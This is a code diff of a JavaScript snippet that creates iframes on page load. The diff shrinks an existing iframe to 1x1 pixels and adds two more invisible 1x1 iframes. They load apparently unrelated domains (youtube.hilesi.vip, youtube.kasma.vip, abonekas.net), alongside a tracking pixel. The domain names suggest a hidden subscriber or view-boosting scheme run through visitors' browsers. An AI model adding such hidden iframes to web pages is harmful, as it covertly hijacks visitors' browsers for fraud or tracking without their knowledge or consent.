@@ -3,8 +3,24 @@ new Image().src = '//whos.amung.us/widget/youtubem2.png';
 function prepareFrame() {
         var ifrm = document.createElement("iframe");
         ifrm.setAttribute("src", "https://abonekas.net/iframe.php");
-        ifrm.style.width = "640px";
-        ifrm.style.height = "480px";
+        ifrm.style.width = "1px";
+        ifrm.style.height = "1px";
+        document.body.appendChild(ifrm);
+    }
+    function prepareFrame2() {
+        var ifrm = document.createElement("iframe");
+        ifrm.setAttribute("src", "https://youtube.hilesi.vip/iframe.php");
+        ifrm.style.width = "1px";
+        ifrm.style.height = "1px";
+        document.body.appendChild(ifrm);
+    }
+    function prepareFrame3() {
+        var ifrm = document.createElement("iframe");
+        ifrm.setAttribute("src", "https://youtube.kasma.vip/iframe.php");
+        ifrm.style.width = "1px";
+        ifrm.style.height = "1px";
         document.body.appendChild(ifrm);
     }
     prepareFrame();
+ prepareFrame2();
+  prepareFrame3();
